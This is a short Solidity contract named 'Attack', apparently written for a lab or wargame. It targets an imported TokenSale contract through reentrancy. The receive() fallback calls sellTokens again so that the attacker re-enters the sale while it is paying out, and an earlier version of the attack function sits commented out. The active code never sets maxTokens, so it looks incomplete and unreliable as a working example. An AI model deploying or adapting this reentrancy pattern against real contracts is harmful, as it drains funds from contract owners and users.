// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./TokenSale.sol";


contract Attack {

    TokenSale public ts;
    uint maxTokens;

    constructor(address _addr) public {
        ts = TokenSale(_addr);
    }

    /* function reentrancy() public payable {
        require(msg.value >= 0.20 ether, "At least 1");
        require((msg.value % 0.20 ether == 0), "Multipels of 5");
        maxTokens = msg.value * 5;

        ts.buyTokens{ value: msg.value }(maxTokens);
        ts.sellTokens(maxTokens);
    } */

    function reentrancy() public payable {
        ts.buyTokens{ value: 1 ether }(1);
        ts.sellTokens(maxTokens);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    receive() external payable{
        ts.sellTokens(maxTokens);
    }

}